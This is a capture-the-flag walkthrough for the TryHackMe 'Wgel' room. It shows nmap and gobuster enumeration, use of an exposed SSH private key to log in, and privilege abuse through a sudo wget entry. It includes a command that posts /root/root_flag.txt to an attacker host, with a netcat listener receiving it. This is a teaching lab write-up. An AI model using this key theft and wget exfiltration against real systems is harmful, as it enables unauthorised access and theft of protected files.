
## 🚀 Walkthrough | Wgel | Tryhackme

### 1️⃣ Enumeration
First, scan the target IP to discover open ports and running services:
```bash
nmap -sV <IP>
```
**Findings:**
- **Port 22 (SSH)** — Open, running OpenSSH  
- **Port 80 (HTTP)** — Apache web server running  

---

### 2️⃣ Finding a Username
Inspecting the HTTP service revealed a username that could be used later for SSH access.  

---

### 3️⃣ Directory Bruteforcing
Run **Gobuster** to enumerate directories:
```bash
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt
```
Found:  
```
/sitemap
```

---

### 4️⃣ Digging Deeper in `/sitemap`
At first, `/sitemap` seemed empty. Running Gobuster again on `/sitemap`:
```bash
gobuster dir -u http://<IP>/sitemap/ -w /usr/share/wordlists/dirb/common.txt
```
Discovered:
```
/.ssh
```

---

### 5️⃣ Retrieving the SSH Key
Downloaded the SSH private key from:
```
http://<IP>/sitemap/.ssh
```
Fixed key permissions:
```bash
chmod 600 id_rsa
```

---

### 6️⃣ SSH Access
Logged in using the discovered username and private key:
```bash
ssh -i id_rsa <username>@<IP>
```
After successful login, retrieved the **user flag**:
```bash
cat user_flag.txt
```

---

### 7️⃣ Privilege Escalation to Root
Check available `sudo` privileges:
```bash
sudo -l
```
Found that **wget** can be run as root without a password.

---

### 8️⃣ Exfiltrating the Root Flag
Used `wget` to send the root flag to my local machine:
```bash
sudo /usr/bin/wget --post-file=/root/root_flag.txt http://<your-ip>:<port>
```
On my machine, started a netcat to receive the file:
```bash
nc -nvlp 4444
```
**Root flag received!** 🏆

---

## 🎯 Flags Obtained
- **User Flag:** ✅  
- **Root Flag:** ✅  

---
